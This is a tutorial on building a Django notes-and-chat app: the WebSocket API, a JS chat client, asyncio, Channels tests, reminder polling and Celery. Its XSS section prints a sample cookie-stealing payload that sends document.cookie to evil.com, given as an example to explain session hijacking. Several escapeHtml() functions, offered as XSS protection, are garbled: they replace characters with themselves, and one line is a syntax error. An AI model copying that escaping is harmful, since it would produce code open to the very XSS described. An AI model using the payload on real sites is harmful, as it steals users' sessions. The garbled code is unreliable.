docs.title: The vanilla JS WebSocket API
docs.text:
The browser WebSocket API is built in, no libraries needed:

// Open a connection
const ws = new WebSocket('ws://127.0.0.1:8001/ws/groups/7/chat/')
//                        ↑ ws:// for HTTP, wss:// for HTTPS

ws.onopen    = () => { /* connection established */ }
ws.onmessage = (e) => { const data = JSON.parse(e.data) }  // the server sent something
ws.onclose   = (e) => { /* close code: 1000=normal, 1006=abnormal */ }
ws.onerror   = (e) => { /* connection error */ }

ws.send(JSON.stringify({ content: "Hi!" }))  // send to the server
ws.close()                                    // close the connection

docs.title: readyState values
docs.text: ws.readyState Constant Meaning 0 WebSocket.CONNECTING The connection is being established 1 WebSocket.OPEN The connection is open, you can send 2 WebSocket.CLOSING The connection is closing 3 WebSocket.CLOSED The connection is closed

docs.title: Close codes
docs.text:
Code Meaning 1000 Normal closure — do NOT reconnect 1001 The page is closing — do NOT reconnect 1006 Abnormal (the internet connection dropped) — reconnect 4001 Custom (example): not authenticated — not used in notes_chat_app 4003 Custom (example): not a member of the group — not used in notes_chat_app

An application may choose codes 4000–4999 itself. GroupChatConsumer in this project rejects a connection with a plain close() before accept(), so the browser sees 1006.

docs.title: The full notes_chat_app JS client
docs.text:
// notes_app/static/notes_app/js/group_chat.js
// WebSocket chat client (vanilla JavaScript). The long explanatory comment at the top of the file is omitted here.

// IIFE: all the code inside a function, so no global variables are created.
(function () {
    'use strict';

    // ── Config (data attributes of the hidden div#chat-config) ──
    const config    = document.getElementById('chat-config');
    const GROUP_PK  = config.dataset.groupPk;
    const USERNAME  = config.dataset.username;

    // ── DOM refs ──
    const messagesEl  = document.getElementById('chat-messages');
    const placeholderEl = document.getElementById('chat-placeholder');
    const inputEl     = document.getElementById('chat-input');
    const formEl      = document.getElementById('chat-form');
    const sendBtnEl   = document.getElementById('chat-send-btn');
    const statusDotEl = document.getElementById('status-dot');
    const statusTextEl = document.getElementById('status-text');

    // ws:// for HTTP, wss:// for HTTPS (ngrok); location.host includes the port
    const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
    const WS_URL   = `${protocol}://${window.location.host}/ws/groups/${GROUP_PK}/chat/`;

    let socket = null;
    // Exponential backoff: 1s → 2s → 4s ... → at most 30s
    let reconnectDelay = 1000;

    function connect() {
        setStatus('connecting');
        socket = new WebSocket(WS_URL);

        socket.onopen = function () {
            setStatus('connected');
            reconnectDelay = 1000; // reset the backoff after a successful connection
            inputEl.disabled = false;
            sendBtnEl.disabled = false;
            inputEl.focus();
            placeholderEl.style.display = 'none';
        };

        socket.onmessage = function (event) {
            let data;
            try {
                data = JSON.parse(event.data);
            } catch (e) {
                console.error('[chat] Невалідний JSON від сервера:', event.data);
                return;
            }
            // history comes from load_history() on connect(); message is real-time from chat_message()
            if (data.type === 'history' || data.type === 'message') {
                appendMessage(data);
            }
        };

        socket.onerror = function (event) {
            console.error('[chat] WebSocket помилка:', event);
            setStatus('error');
        };

        socket.onclose = function (event) {
            setStatus('disconnected');
            inputEl.disabled = true;
            sendBtnEl.disabled = true;

            // Do not reconnect on 1000/1001 (intentional closure); otherwise backoff + 0–1s jitter
            if (event.code !== 1000 && event.code !== 1001) {
                const jitter = Math.random() * 1000;
                setTimeout(connect, reconnectDelay + jitter);
                reconnectDelay = Math.min(reconnectDelay * 2, 30000);
            }
        };
    }

    // ── SEND ──
    formEl.addEventListener('submit', function (event) {
        event.preventDefault(); // do NOT submit the form as an HTTP POST

        const content = inputEl.value.trim();
        if (!content) return;
        if (!socket || socket.readyState !== WebSocket.OPEN) return;

        socket.send(JSON.stringify({ content: content }));

        inputEl.value = '';
        inputEl.focus();
    });

    // Enter → submit (Shift+Enter → no send)
    inputEl.addEventListener('keydown', function (event) {
        if (event.key === 'Enter' && !event.shiftKey) {
            event.preventDefault();
            formEl.dispatchEvent(new Event('submit'));
        }
    });

    // ── RENDER MESSAGE ──
    function appendMessage(data) {
        const isMine = data.author === USERNAME;   // own messages on the right, others on the left

        const time = new Date(data.timestamp).toLocaleTimeString('uk-UA', {
            hour: '2-digit',
            minute: '2-digit',
        });

        const wrapper = document.createElement('div');
        wrapper.className = `d-flex mb-2 ${isMine ? 'justify-content-end' : 'justify-content-start'}`;
        if (data.message_id) {
            wrapper.dataset.messageId = data.message_id;
        }

        // escapeHtml() is MANDATORY before any user content in innerHTML
        wrapper.innerHTML = `
          <div class="chat-bubble ${isMine ? 'chat-mine' : 'chat-other'}">
            ${!isMine ? `<div class="chat-author">${escapeHtml(data.author)}</div>` : ''}
            <div class="chat-content">${escapeHtml(data.content)}</div>
            <div class="chat-time">${time}</div>
          </div>`;

        messagesEl.appendChild(wrapper);
        messagesEl.scrollTop = messagesEl.scrollHeight;
    }

    // ── STATUS INDICATOR ──
    const STATUS_CONFIG = {
        connecting:   { color: '#ffc107', text: 'Підключення...' },
        connected:    { color: '#198754', text: 'Підключено' },
        disconnected: { color: '#6c757d', text: 'Відключено. Перепідключення...' },
        error:        { color: '#dc3545', text: 'Помилка з\'єднання' },
    };

    function setStatus(key) {
        const cfg = STATUS_CONFIG[key] || STATUS_CONFIG.error;
        statusDotEl.style.background = cfg.color;
        statusTextEl.textContent = cfg.text;
    }

    // ── XSS PREVENTION ──
    function escapeHtml(str) {
        return String(str)
            .replace(/&/g, '&')
            .replace(/</g, '<')
            .replace(/>/g, '>')
            .replace(/"/g, '"')
            .replace(/'/g, ''');
    }

    // ── START ──
    inputEl.disabled = true;     // the input is disabled until the connection is established
    sendBtnEl.disabled = true;
    connect();

}());

Key details of the real client:

  • the code is wrapped in an IIFE (function () { ... }()); the script is loaded at the end of the page, so DOMContentLoaded is not needed;
  • GROUP_PK and USERNAME are read from the hidden div#chat-config; USERNAME is needed to show your own messages on the right;
  • the connection status is shown by two elements: the colored dot #status-dot and the text #status-text;
  • reconnecting: on any code except 1000/1001, the delay doubles from 1 s up to a maximum of 30 s, plus a random 0–1 s jitter; there is no attempt limit;
  • the client does not handle frames with type: 'error'; the consumer does not send them either.

The UI strings stay in Ukrainian, as in the real file: Підключення... (Connecting...), Підключено (Connected), Відключено. Перепідключення... (Disconnected. Reconnecting...), Помилка з'єднання (Connection error).

How group_pk gets to the JS: 

<div id="chat-config" data-group-pk="{{ group.pk }}" data-username="{{ request.user.username }}" style="display:none;"></div>

const config   = document.getElementById('chat-config');
const GROUP_PK = config.dataset.groupPk;
// ↑ dataset.groupPk reads the data-group-pk attribute (automatic camelCase conversion)

docs.title: Connection state (the status bar in the UI)
docs.text:
connecting → connected → (on failure) disconnected → (auto-reconnect) connecting → ...

Auto-reconnect logic (socket.onclose):
  1000 = normal closure        → do NOT reconnect
  1001 = the page is closing   → do NOT reconnect
  any other code (including 1006: internet, the server crashed,
  or the server rejected the handshake) → reconnect

Exponential backoff with jitter:
  Attempt 1: after ~1000ms (+ 0–1000ms jitter)
  Attempt 2: after ~2000ms
  Attempt 3: after ~4000ms
  ...
  Maximum: 30000ms (Math.min(reconnectDelay * 2, 30000))
  There is no attempt limit; after a successful onopen the delay resets to 1000ms.
  A refused access (not a group member) also arrives as 1006,
  so the client keeps retrying with a backoff of up to 30 s.

docs.title: Two types of messages from the server
docs.text: type When From what What is displayed history Right after connect() load_history() in the consumer The last 50 messages from the DB message Real-time chat_message() in the consumer A new message from anyone

docs.title: XSS protection: the escapeHtml function
docs.text: The chat displays content from other users — a classic XSS attack point.

docs.title: The attack vector
docs.text:
An attacker sends to the chat:
  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

If the JS client inserts it via innerHTML without escaping:
  div.innerHTML = data.content  ← DANGEROUS

→ The browser parses the HTML → the img fails to load → onerror fires
→ fetch() sends the cookies to evil.com → sessions are stolen
→ Session Hijacking: the attacker obtains the sessionid of every chat participant

docs.title: Three safe options
docs.text:
// ✅ Method 1: textContent (text only, HTML is not parsed)
messageDiv.textContent = data.content

// ✅ Method 2: createTextNode
messageDiv.appendChild(document.createTextNode(data.content))

// ✅ Method 3: escapeHtml() before innerHTML (if you need HTML markup)
function escapeHtml(text) {
    const div = document.createElement('div')
    div.appendChild(document.createTextNode(text))
    return div.innerHTML
    // & → &  < → <  > → >  (quotes are NOT escaped, so unsafe inside attributes)
}
wrapper.innerHTML = `<strong>${escapeHtml(data.author)}</strong>: ${escapeHtml(data.content)}`

docs.title: Why innerHTML is dangerous without escaping
docs.text:
// ❌ DANGEROUS: user content directly in innerHTML
div.innerHTML = data.content  // the attacker sends <script>...</script> → XSS

// ✅ CORRECT: escapeHtml() before any user content
wrapper.innerHTML = `<div class="chat-content">${escapeHtml(data.content)}</div>`
// escapeHtml replaces: & → &  < → <  > → >  " → "  ' → '

In notes_chat_app we use method 3 (escapeHtml) — we need HTML markup for the message (author, time and content in separate elements), so textContent won't do. The real group_chat.js implements escapeHtml() as a chain of .replace() calls that also escapes " and ' (see the full code above).

docs.title: The full flow: from pressing Enter to the message appearing for everyone
docs.text:
sequenceDiagram
    participant Viktor_JS as Viktor's browser (JS)
    participant Viktor_WS as Viktor's consumer
    participant ChannelLayer as Channel layer
    participant Olya_WS as Olya's consumer
    participant Olya_JS as Olya's browser (JS)
    participant DB as PostgreSQL

    Viktor_JS->>Viktor_WS: ws.send({content: "Hi!"})
    Viktor_WS->>DB: save_message() via database_sync_to_async
    DB-->>Viktor_WS: ChatMessage(id=42, timestamp=...)
    Viktor_WS->>ChannelLayer: group_send("chat_group_7", {type:"chat_message", ...})
    par channel layer broadcast
        ChannelLayer->>Viktor_WS: chat_message(event)
        ChannelLayer->>Olya_WS: chat_message(event)
    end
    Viktor_WS->>Viktor_JS: ws.onmessage({type:"message", author:"Viktor", ...})
    Olya_WS->>Olya_JS: ws.onmessage({type:"message", author:"Viktor", ...})
    Note over Viktor_JS,Olya_JS: "Hi!" appears simultaneously in both browsers

This whole path happens without a single HTTP request. Only WebSocket frames.

DevTools → Network → WS tab:
  - Find the ws://... row (the WebSocket connection)
  - Click on it
  - The "Messages" tab — all WS frames in real time
  - ↑ Green = sent by the browser (send)
  - ↓ White = received from the server (receive)

docs.title: Why HTTP is not suitable for chat
docs.text:
HTTP is a "request → response → connection closed" protocol. The server cannot send a message to the browser without a request from the browser.

HTTP (classic):
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  (a new connection every time — the server is silent between requests)

The problem for chat: the server cannot send a message to the browser FIRST. If Olya writes "Hi", Viktor's browser only learns about it on its next request. When should that next request happen? We don't know.

docs.title: Two "hacky" workarounds over HTTP
docs.text: Approach How it works Problem Polling The browser requests /new-messages/ every 2 seconds 1000 users = 500 requests/sec. A message arrives with a delay of up to 2 sec Long polling The browser sends a request, and the server "holds" it open until a new message appears 1000 users = 1000 blocked threads on the server Server-Sent Events A one-way stream from the server to the browser Not bidirectional (the browser cannot send)

docs.title: Long polling + sync Django = a concurrency disaster
docs.text:
Sync Django thread pool:
  Typically: 4–16 worker threads (gunicorn/wsgi)

  1000 users in the chat → 1000 threads blocked waiting for a message
  Thread pool exhausted → the rest of the site (forms, notes, login) stops responding
  Each blocked thread: ~8 MB RAM for its stack → 1000 users = ~8 GB RAM just for threads

docs.title: WebSocket — a persistent bidirectional connection
docs.text: A WebSocket is established through an HTTP Upgrade handshake once, after which the open TCP connection lives until the tab is closed.

docs.title: Handshake
docs.text:
1. Browser: GET /ws/groups/7/chat/ HTTP/1.1
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

2. Server:  HTTP/1.1 101 Switching Protocols
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. After this — not HTTP, but WebSocket frames (a binary protocol on top of TCP)

docs.title: Flow after the connection is established
docs.text:
WebSocket (after the handshake):
  Browser ════════════ PERSISTENT TCP ════════════ Server
  ↑ Either side can send data at any moment

  Viktor: ws.send({content: "Hi!"}) ──────────────► consumer.receive()
                                                          │
                                                     group_send()
                                                          │
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Olya
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Masha
          ws.onmessage ◄── consumer.send() ◄─────────────┘ Viktor

docs.title: The browser WebSocket API
docs.text:
// Built into the browser — no libraries needed
const ws = new WebSocket('ws://localhost/ws/groups/7/chat/')
//                        ↑ ws:// for HTTP, wss:// for HTTPS

ws.onopen = () => {
    console.log('Connected to the chat')
}

ws.onmessage = (event) => {
    const data = JSON.parse(event.data)
    console.log('New message:', data)
}

ws.onclose = (event) => {
    // event.code:
    //   1000 — normal closure
    //   1001 — the page is closing
    //   1006 — abnormal (the internet connection dropped)
    //   4003 — custom code (an example; our consumer does not send it)
    console.log(`Connection closed: ${event.code}`)
}

ws.onerror = (error) => {
    console.error('WS error:', error)
}

ws.send(JSON.stringify({ content: 'Hi!' }))
ws.close()

docs.title: asyncio — the event loop and coroutines
docs.text: To understand Django Channels, you need to understand asyncio, Python's standard library for asynchronous programming.

docs.title: The event loop — the heart of async Python
docs.text:
import asyncio

# Event loop — a "scheduler" of coroutines
# NOT parallel execution (not threading)
# Cooperative multitasking: tasks voluntarily yield via await

asyncio.run(main())

Event loop — one thread, many coroutines:

  ┌──────────────────────────────────────────────────────────┐
  │  Task 1: fetch(url_a) ──── await ──→ PAUSE               │
  │  Task 2: fetch(url_b) ──── await ──→ PAUSE               │
  │  Task 3: fetch(url_c) ──── await ──→ PAUSE               │
  │                                                           │
  │  I/O ready for Task 1 → RESUME Task 1                    │
  │  I/O ready for Task 3 → RESUME Task 3                    │
  │  I/O ready for Task 2 → RESUME Task 2                    │
  └──────────────────────────────────────────────────────────┘

  ≠ Threading (parallel execution in several OS threads)
  = Cooperative multitasking (one thread, switching via await)

docs.title: Coroutine vs a regular function
docs.text:
# A regular function — runs to completion without pausing
def sync_fetch(url):
    response = requests.get(url)   # blocks the thread for the whole request
    return response.text

# A coroutine — can pause and yield to the event loop
async def async_fetch(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.text()  # this is where it yields to the event loop

docs.title: await — where the switching happens
docs.text:
async def handler():
    # await = "start an async operation and yield to the event loop"
    result = await some_async_operation()

    # CPU code — the event loop does NOT switch here
    processed = process(result)

    return processed

docs.title: asyncio.gather — concurrent operations
docs.text:
async def fetch_all():
    # Runs three tasks "simultaneously" (concurrent, not parallel)
    results = await asyncio.gather(
        fetch(url_1),
        fetch(url_2),
        fetch(url_3),
    )
    # If each fetch takes 1 sec → ~1 sec in total (not 3)
    return results

docs.title: Why WebSocket and sync Django don't mix
docs.text:
A sync view in Django: handles the request → returns the response → the thread is free. A WebSocket connection: opens → stays open for hours.

Sync Django + WebSocket:
  1000 users in the chat → 1000 threads blocked until the tabs are closed
  Thread pool exhausted → the rest of the site stops responding

  Solve it with more threads? 1000 OS threads ≈ 8 GB RAM just for stacks
  That doesn't scale.

Async + WebSocket — the right architecture:

Async Django Channels:
  1000 users in the chat → 1000 Consumer objects in memory
  Each Consumer is a coroutine that "sleeps" while there are no messages
  The event loop serves the active connections (where there are messages)
  The CPU is busy only when there is something to process

  1000 open connections ≈ RAM for 1000 Python objects (a few MB)

docs.title: Comparing the models
docs.text: Sync (WSGI/Gunicorn) Async (ASGI/Uvicorn) Model Thread per request Event loop + coroutines 1000 connections 1000 OS threads (~8 GB RAM) 1000 coroutines (~a few MB) CPU while there are no messages The thread is blocked and "sleeps" The event loop serves others Code complexity Simpler (sync Python) More complex (async/await everywhere) Risks Thread exhaustion Blocking calls in an async context Server sends data without a request from the browser ❌ Impossible ✅ consumer.send() Connection open for hours ❌ Blocks a thread ✅ The coroutine "sleeps" Broadcasting one message to everyone ❌ No mechanism ✅ channel_layer.group_send()

docs.title: Where async is the only right choice
docs.text:
Sync Django: CRUD for notes, forms, authentication
  → sync is perfectly suitable
  → switching to async: complicates the code, gives nothing

Async Django Channels: 1000 simultaneous WS connections in the chat
  → sync is impossible (thread exhaustion)
  → async is the only right approach

Rule: async is justified for long-lived connections and high-concurrency I/O. For ordinary CRUD it is unnecessary complexity.

docs.title: What is async and what is sync in notes_chat_app
docs.text: Feature Implementation Why Notes, Notebooks, Tags Sync views Simple CRUD, short requests TodoList, ShoppingList Sync views Simple mutations Authentication (login/register) Sync views Standard Django auth Group chat AsyncWebsocketConsumer WS = thousands of long-lived connections

docs.title: Summary: why chat is the ideal demonstration of async
docs.text:
The async views in part 7A (the async_views.py sections) show how to write async code. Technically, the same result can be achieved with sync code.

The group chat shows why async exists — here sync is architecturally impossible:

  • a WebSocket connection lives for minutes or hours, not milliseconds like an HTTP request;
  • in the WSGI model every such connection would hold a separate thread: 1000 chat members → 1000 threads that wait almost all the time;
  • the server must push messages to clients by itself, while WSGI only supports the "request → response" scheme;
  • an async consumer "sleeps" in the event loop and holds no thread while there are no messages, so one process serves thousands of connections.

This is not "async is better" — it is "for long-lived connections sync is architecturally unsuitable". That is why the group chat is the best demonstration: not a stylistic advantage, but a necessity.

docs.title: Why TransactionTestCase and not TestCase
docs.text:
TestCase: wraps each test in a transaction (rollback after the test)
  → WebsocketCommunicator opens a separate thread for the consumer
  → The consumer in another thread does not see the uncommitted setUp() data
  → setUp objects (User, Group) "disappear" for the consumer

TransactionTestCase: does not wrap in a transaction
  → Data is written to the DB and is visible to all threads
  → The consumer sees the User and Group from setUp()
  → The right choice for tests through WebsocketCommunicator

docs.title: Basic structure
docs.text:
# notes_app/tests/test_consumers.py
import json
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import User, Group
from django.test import TransactionTestCase, override_settings

from notes_project.asgi import application

TEST_CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}


def _make_session_cookie(user):
    """Helper: creates a session cookie for user."""
    from importlib import import_module
    from django.conf import settings

    engine = import_module(settings.SESSION_ENGINE)
    session = engine.SessionStore()
    if user:
        session[settings.AUTH_USER_SESSION_KEY] = user.pk
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = user.get_session_auth_hash()
    session.save()
    return session.session_key


@override_settings(CHANNEL_LAYERS=TEST_CHANNEL_LAYERS)
class GroupChatConsumerTest(TransactionTestCase):

    def setUp(self):
        # setUp() is synchronous, even if the tests are async.
        # We make ORM calls directly: setUp() never runs
        # in an async context, so database_sync_to_async is not needed.
        self.user = User.objects.create_user('testuser', password='testpass123')
        self.other_user = User.objects.create_user('otheruser', password='testpass123')
        self.group = Group.objects.create(name='Test Group')
        self.group.user_set.add(self.user)

    def _communicator(self, user=None, group_pk=None):
        session_key = _make_session_cookie(user)
        pk = group_pk if group_pk is not None else self.group.pk
        return WebsocketCommunicator(
            application,
            f"/ws/groups/{pk}/chat/",
            headers=[(b"cookie", f"sessionid={session_key}".encode())],
        )

asyncSetUp() in Django 5.1+

Django 5.1 added asyncSetUp() and asyncTearDown() to TransactionTestCase. In Django 5.2+ you can write: 

async def asyncSetUp(self):
    self.user = await User.objects.acreate_user('testuser', password='pass')
    self.group = await DjangoGroup.objects.acreate(name='Chat')
    await self.group.user_set.aadd(self.user)
Both approaches are correct. notes_chat_app uses a synchronous setUp(): it is simpler and does not require database_sync_to_async in the initialization method.

async def test_message_broadcast_to_all_members(self):
        await database_sync_to_async(self.group.user_set.add)(self.other_user)

        comm1 = self._communicator(user=self.user)
        comm2 = self._communicator(user=self.other_user)

        await comm1.connect()
        await comm2.connect()

        await comm1.send_json_to({'content': 'Привіт від testuser'})

        response1 = await comm1.receive_json_from()
        response2 = await comm2.receive_json_from()

        self.assertEqual(response1['type'], 'message')
        self.assertEqual(response1['content'], 'Привіт від testuser')

        self.assertEqual(response2['type'], 'message')
        self.assertEqual(response2['content'], 'Привіт від testuser')

        await comm2.disconnect()

async def test_message_saved_to_database(self):
        from notes_app.models import ChatMessage

        comm = self._communicator(user=self.user)
        await comm.connect()

        await comm.send_json_to({'content': 'Тестове повідомлення'})

docs.title: Why not WebSocket for notifications
docs.text:
Celery sends email in the background. But to show a reminder right in the browser, you need a separate mechanism.

WebSocket is ideal for a live two-way stream (chat). For reminders HTTP polling is enough: a simpler mechanism without a persistent connection.

WebSocket HTTP polling Suitable for live chat, a real-time board rare updates (once a minute) Connection persistent closed after every request Complexity AuthMiddlewareStack, consumer, ASGI an ordinary @login_required view When WebSocket is not needed reminders once a minute ✅ exactly this case

Conclusion: for reminders that are checked once a minute, HTTP polling is the correct and simpler choice. WebSocket is appropriate where latency < 1 second matters (chat, collaborative editing).

docs.title: JSON endpoint
docs.text:
# notes_app/selectors.py
def get_due_reminders_for_browser(user):
    from datetime import timedelta
    now = timezone.now()
    return list(
        Reminder.objects
        .filter(
            note__user=user,
            remind_at__lte=now,
            remind_at__gte=now - timedelta(hours=1),   # 1-hour window
        )
        .select_related('note')
        .order_by('remind_at')
        .values('id', 'message', 'remind_at', 'note__title')
    )

# notes_app/views.py
@login_required
def reminders_check(request):
    data = selectors.get_due_reminders_for_browser(request.user)
    for item in data:
        item['remind_at'] = item['remind_at'].strftime('%d.%m.%Y %H:%M')
    return JsonResponse({'reminders': data})

The 1-hour window (remind_at__gte=now - timedelta(hours=1)): if the user opens the browser 30 minutes after the reminder, they still see the Toast. Reminders older than 1 hour are no longer relevant.

docs.title: JavaScript polling
docs.text:
// notes_app/static/notes_app/js/reminders.js
(function () {
  'use strict';

  var POLL_INTERVAL = 60_000;           // 60 seconds
  var STORAGE_KEY   = 'shown_reminders'; // sessionStorage for deduplication
  var CHECK_URL     = '/reminders/check/';

  function getShownIds() {
    try {
      return new Set(JSON.parse(sessionStorage.getItem(STORAGE_KEY) || '[]'));
    } catch (_) { return new Set(); }
  }

  function markShown(id) {
    var s = getShownIds();
    s.add(id);
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(Array.from(s)));
  }

  function escapeHtml(str) {   // XSS protection: always escape user content
    return String(str)
      .replace(/&/g, '&').replace(/</g, '<')
      .replace(/>/g, '>').replace(/"/g, '"');
  }

  function showToast(reminder) {
    var container = document.getElementById('reminder-toast-container');
    if (!container) return;

    var toastEl = document.createElement('div');
    toastEl.className = 'toast align-items-center border-0';
    toastEl.innerHTML =
      '<div class="d-flex">'
      + '<div class="toast-body">'
      + '<strong>🔔 Нагадування</strong><br>'
      + '<span>' + escapeHtml(reminder.note__title) + '</span><br>'
      + (reminder.message ? '<small>' + escapeHtml(reminder.message) + '</small><br>' : '')
      + '<small class="text-muted">' + escapeHtml(reminder.remind_at) + '</small>'
      + '</div>'
      + '<button type="button" class="btn-close me-2 m-auto"'
      + ' data-bs-dismiss="toast" aria-label="Закрити"></button>'
      + '</div>';

    container.appendChild(toastEl);
    new bootstrap.Toast(toastEl, { delay: 8000, autohide: true }).show();
    toastEl.addEventListener('hidden.bs.toast', function () { toastEl.remove(); });
  }

  async function checkReminders() {
    try {
      var resp = await fetch(CHECK_URL, { credentials: 'same-origin' });
      if (!resp.ok) return;
      var data = await resp.json();
      var shown = getShownIds();
      (data.reminders || []).forEach(function (r) {
        if (!shown.has(r.id)) { showToast(r); markShown(r.id); }
      });
    } catch (_) { /* silent fail: network unavailable */ }
  }

  document.addEventListener('DOMContentLoaded', function () {
    if (!document.getElementById('reminder-toast-container')) return;
    checkReminders();                          // right away on load
    setInterval(checkReminders, POLL_INTERVAL); // then every 60 seconds
  });
})();

Key decisions:

Decision Reason sessionStorage for deduplication The Toast will not appear twice in the same session escapeHtml() for all user content XSS: an attacker could put <script> into a note title checkReminders() right on DOMContentLoaded the test does not wait 60 seconds: the check happens on the first load IIFE (function () { ... })() module isolation: no global variables

docs.title: Architecture: Celery ↔ JSON endpoint ↔ JS polling
docs.text:
Celery Worker
    │  reminder.is_sent = True
    │  (writes to PostgreSQL)
    ▼
PostgreSQL
    │  Reminder.objects.filter(note__user=user,
    │      remind_at__lte=now, remind_at__gte=now - 1 h)
    │  (read by the get_due_reminders_for_browser selector; is_sent is not checked)
    ▼
GET /reminders/check/
    │  JsonResponse({'reminders': [...]})
    ▼
reminders.js (fetch every 60 sec)
    │  showToast(r)
    ▼
Bootstrap Toast (bottom right)

Note: Celery and JS polling do not interact directly. Celery writes state to the database, and JS reads it through an ordinary HTTP endpoint. This simplifies the architecture and makes each part independently testable.

# notes_app/urls.py
from django.urls import path
from . import views

urlpatterns = [
    # ... other URLs ...
    path('reminders/check/', views.reminders_check, name='reminders_check'),

docs.title: The problem: why a Django view cannot send email
docs.text:
Django is built on the Request → Response model. Each HTTP request occupies one thread of execution. Until the view returns a response, the browser waits. That is why every operation inside a view has to finish as quickly as possible.

Look at what happens if you try to send reminders right inside a view:

# ❌ DON'T DO THIS: it is an antipattern
def note_detail(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)

    # Check every reminder for every user...
    for reminder in Reminder.objects.filter(remind_at__lte=timezone.now()):
        send_mail(...)   # an SMTP connection takes 300–500 ms per email
        reminder.is_sent = True
        reminder.save()

    return render(request, 'notes_app/note_detail.html', {'note': note})

If there are 20 reminders, the view blocks the thread for 6–10 seconds. The browser shows "Loading..." the whole time. With 100 concurrent users the server goes down.

Three fundamental problems with this approach:

Problem Why it happens Consequence send_mail() blocks the thread The SMTP handshake is a network operation the page takes 5+ seconds to load Runs only on an HTTP request the view fires only when someone opens the page the reminder is not sent if nobody opens /notes/42/ at exactly 14:00 Impossible to schedule an exact time standard Django has no "run at 14:00" mechanism the reminder is either early or late

Rule: a Django view must not perform operations that take more than ~200 ms or depend on time. That is what background task queues exist for.

docs.title: What a task queue is
docs.text:
A task queue is the "producer → queue → consumer" architectural pattern:

Django (view)                           Celery Worker
   │                                        │
   │  task.delay()                          │
   │  "put the task in the queue"           │
   ▼                                        │
Redis (broker)  ←────────────────────────  │
   │            "there is a new task"       │
   │                                        │
   └──────────────────────────────────────► │
                 "I take the task and run it"
                                            ▼
                                       send_mail()
                                       reminder.is_sent = True

The key idea: Django does not wait for the task to finish. It says "here is a task, run it" and immediately returns a response to the browser. The worker runs the task separately, in its own process.

docs.title: Celery: a task queue implementation for Python
docs.text: Celery is the most popular task queue library for Python/Django. It consists of several components:

docs.title: Celery components
docs.text:
┌─────────────────────────────────────────────────────────────────────┐
│                        THE CELERY SYSTEM                            │
│                                                                     │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────────────────┐  │
│  │  Django  │    │    Redis     │    │     Celery Worker        │  │
│  │  (view)  │───►│   (broker)  │───►│                          │  │
│  │          │    │             │    │  @shared_task functions   │  │
│  └──────────┘    └──────────────┘    └──────────────────────────┘  │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    Celery Beat                               │   │
│  │  (scheduler, runs tasks on a schedule, without Django)      │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
Component Role Analogy Task (@shared_task) A Python function that can be put in the queue "an order" Broker (Redis) a message queue that stores tasks "the checkout line" Worker a separate process that reads tasks and runs them "the cashier" Beat a separate scheduler process that queues tasks on a schedule "the alarm clock" Result Backend (Redis) stores the results of completed tasks "the receipt"

docs.title: How Beat queues tasks without Django
docs.text:
Beat is a separate Python process started with the command:

celery -A notes_project beat -l info

It reads CELERY_BEAT_SCHEDULE from settings.py and every N seconds publishes a message to Redis:

Beat (every 60 sec):
  └─► publishes to Redis: {"task": "notes_app.tasks.send_reminder_notifications", "args": [], "kwargs": {}}

Worker (constantly listens to Redis):
  └─► receives the message → runs send_reminder_notifications()

Beat does not run the task itself: it only puts it in the queue. The worker runs it.

docs.title: Breaking down the Worker start command
docs.text:
celery -A notes_project worker -l info --concurrency=2
Part What it means celery The Celery CLI -A notes_project the "app": reads notes_project/celery.py worker start a Worker (not Beat) -l info logging level (info, debug, warning, error) --concurrency=2 2 parallel executor processes

docs.title: The architecture of the reminder system in notes_chat_app
docs.text:
The project has two independent reminder mechanisms:

MECHANISM 1: Email (always, regardless of the browser)
─────────────────────────────────────────────────
Celery Beat (every 60 seconds)
    │
    ▼
@shared_task send_reminder_notifications()
    │
    ├─ SELECT * FROM reminder WHERE remind_at <= now AND is_sent = FALSE
    │
    └─ for each reminder:
          ├── send_mail(to=user.email, ...)  ← in dev, email is printed to the console
          ├── reminder.is_sent = True
          ├── reminder.save(update_fields=['is_sent'])
          └── _schedule_next(reminder)       ← if repeat_pattern ≠ 'none'

MECHANISM 2: Browser Toast (only while the browser is open)
───────────────────────────────────────────────────────────
reminders.js (DOMContentLoaded + every 60 sec)
    │
    ├─ GET /reminders/check/
    │      └─ JsonResponse({reminders: [...]})
    │
    └─ for each new reminder:
          └── Bootstrap Toast (bottom right, 8 seconds)

Why two mechanisms and not one?

  • Email is needed even if the browser is closed → Celery Worker
  • The Browser Toast is needed if the browser is open → JS polling
  • They are independent: Celery writes is_sent=True to the DB, JS reads through a separate endpoint

docs.title: The Reminder model
docs.text:
Before moving on to the implementation, understand the data structure:

# notes_app/models.py
class Reminder(models.Model):
    REPEAT_CHOICES = [
        ('none',    'Одноразово'),
        ('daily',   'Щодня'),
        ('weekly',  'Щотижня'),
        ('monthly', 'Щомісяця'),
    ]

    note           = models.ForeignKey(Note, on_delete=models.CASCADE,
                                       related_name='reminders')
    remind_at      = models.DateTimeField()        # when to send
    message        = models.TextField(blank=True)  # reminder text
    is_sent        = models.BooleanField(default=False)  # whether it has been sent already
    repeat_pattern = models.CharField(max_length=10, choices=REPEAT_CHOICES,
                                      default='none')

    class Meta:
        ordering = ['remind_at']

The is_sent field is the key one: the Celery Worker sets it to True after sending. This prevents sending again on the next run of the task.

docs.title: Redis as the broker: why not the database
docs.text:
Popular broker options for Celery:

